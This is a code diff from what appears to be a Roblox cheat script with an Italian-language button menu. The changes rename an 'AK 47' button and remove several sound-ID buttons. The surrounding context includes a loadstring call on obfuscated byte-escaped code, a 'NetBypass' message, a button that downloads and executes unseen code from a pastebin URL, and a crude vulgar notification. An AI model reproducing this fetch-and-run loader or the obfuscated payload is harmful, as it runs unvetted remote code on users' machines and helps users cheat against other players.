@@ -10962,7 +10962,7 @@ loadstring("\13\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\7
 DiscordLib:Notification("Notifica", "Il NetBypass è stato eseguito", "okei")
 end)
 
-Chann5:Button("Fe Ak 47", function()
+Chann5:Button("AK 47", function()
     loadstring(game:HttpGet("https://pastebin.com/raw/9qqaT4ug"))();
 end)
 DiscordLib:Notification("Notifica", "Puoi inculare gli slender bro", "SEE")
@@ -10993,24 +10993,4 @@ end)
 Chann6:Button("Suono rumoroso", function()
     print("Spacco orechie")
 DiscordLib:Notification("Id Suono Rumoroso", "6846153394", "Ok")
-end)
-
-Chann6:Button("Brooklyn Blood Pop", function()
-    print("tulolo")
-DiscordLib:Notification("Brooklyn Blood Pop", "6783714255", "Ok")
-end)
-
-Chann6:Button("Squillo Iphone", function()
-    print("tururu")
-DiscordLib:Notification("Squillo Iphone", "4203251375", "Ok")
-end)
-
-Chann6:Button("Notifica Samsung", function()
-    print("uliliu")
-DiscordLib:Notification("Notifica", "6073491164", "Ok")
-end)
-
-Chann6:Button("Stoop 1hp", function()
-    print("scusa")
-DiscordLib:Notification("Stoop 1hp", "7258313533", "Ok")
 end)
